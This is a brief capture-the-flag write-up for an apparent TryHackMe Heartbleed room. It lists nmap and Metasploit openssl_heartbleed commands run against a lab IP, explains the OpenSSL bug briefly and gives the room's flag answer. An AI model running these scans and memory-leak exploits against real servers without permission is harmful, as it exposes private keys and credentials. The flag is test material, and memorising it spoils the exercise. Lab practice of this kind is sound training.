# Heartbleed - Easy

```shell
nmap -T4 -A -v 34.245.72.138

msfconsole -q

search heartbleed

use auxiliary/scanner/ssl/openssl_heartbleed

show options

set RHOSTS 34.245.72.138

show advanced options

set VERBOSE true

run
#this gives us flag
```

* Heartbleed is a bug due to implementation in ```OpenSSL``` library from versions 1.0.1 to 1.0.1f; this allows a user to access memory on the server.

* Open ports & services:

  * 22 - ssh - OpenSSH 7.4
  * 111 - rpcbind - RPC
  * 443 - ssl/http - nginx 1.15.7

* The webpage does not contain anything interesting.

* As it is given that the exploit is related to the Heartbleed bug, we can search for it on Metasploit.

* We can use the ```openssl_heartbleed``` module with verbosity, and run it to get flag.

```markdown
1. What is the flag? - THM{sSl-Is-BaD}
```
